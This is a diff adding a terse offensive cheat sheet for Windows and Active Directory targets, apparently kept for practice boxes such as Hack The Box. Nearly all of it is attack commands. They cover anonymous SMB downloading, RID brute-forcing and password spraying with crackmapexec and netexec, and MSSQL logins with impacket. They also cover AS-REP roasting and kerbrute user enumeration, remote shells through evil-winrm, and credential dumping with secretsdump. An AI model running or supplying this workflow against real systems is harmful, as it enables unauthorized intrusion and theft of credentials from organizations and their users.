@@ -1,0 +1,42 @@
+1. nmap
+
+2. smb
+2.1 smbclient for unpassed disks
+2.2 smbclient //{IP}/{DIR} -N -c 'prompt OFF;recurse ON;lcd './';mget *' # <- for downloading directory recursively 
+
+OR
+
+2. crackmapexec
+2.1 crackmapexec smb {IP} -u anonymous -p '' --rid-brute 10000
+2.2 crackmapexec smb {IP} -u {user_file_list} -p {password_file_list}
+2.2 crackmapexec mysql {IP} -u {user_file_list} -p {password_file_list}
+IF WORKED
+
+3. netexec
+3.1 netexec smb {IP} -u users.txt -p pass.txt --no-bruteforce
+
+impacket-mssqlclient manager/operator:operator@manager.htb -windows-auth
+
+OR (IN CASES)
+
+impacket-mssqlclient -port {MYSQL_PORT} {IP}/{user}:{pass}@{IP} -window
+
+impacket-GetNPUsers {DOMAIN}/ -no-pass -format {john/hashcat} -usersfile {NP_users.txt}  -dc-ip {IP}
+
+
+4. evil-winrm
+4.1 evil-winrm -i {IP} -u {USER} -p {PASS}
+
+
+ANOTHER ENUM:
+
+lookupsid.py ''@{IP} | tee user.txt && grep SidTypeUser user.txt | awk '{print $2}' | cut -d "\\" -f2 > users.txt
+
+GetNPUsers.py -dc-ip {IP} -usersfile users.txt -no-pass {domain}/
+
+kerbrute userenum --dc {DOMAIN_CONTOL_NAME} -d {DOMAIN} -v /usr/share/{USERNAMES.txt} --hash-file NP.txt | tee kerbrute.out && cat kerbrute.out | grep '+' | awk '{print $7}' > usernames.txt
+
+
+POSET EXPL:
+
+secretsdump.py {domain}/{USER}:{PASS}@{IP}
